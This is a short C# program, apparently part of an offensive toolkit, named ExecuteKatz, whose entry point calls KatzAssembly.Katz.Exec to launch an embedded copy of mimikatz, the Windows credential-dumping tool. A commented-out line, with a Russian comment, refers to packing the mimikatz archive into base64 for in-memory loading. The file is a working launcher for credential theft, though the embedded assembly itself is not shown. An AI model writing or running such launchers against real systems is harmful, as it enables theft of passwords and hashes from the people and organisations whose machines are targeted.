using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ExecuteKatz
{
    class ExecuteKatz
    {
        static void Main(string[] args)
        {
            //KatzAssembly.Program.Main(); //- создаст b64 из архива mimikatz
            KatzAssembly.Katz.Exec(false);
            Console.ReadLine();
        }
    }
}
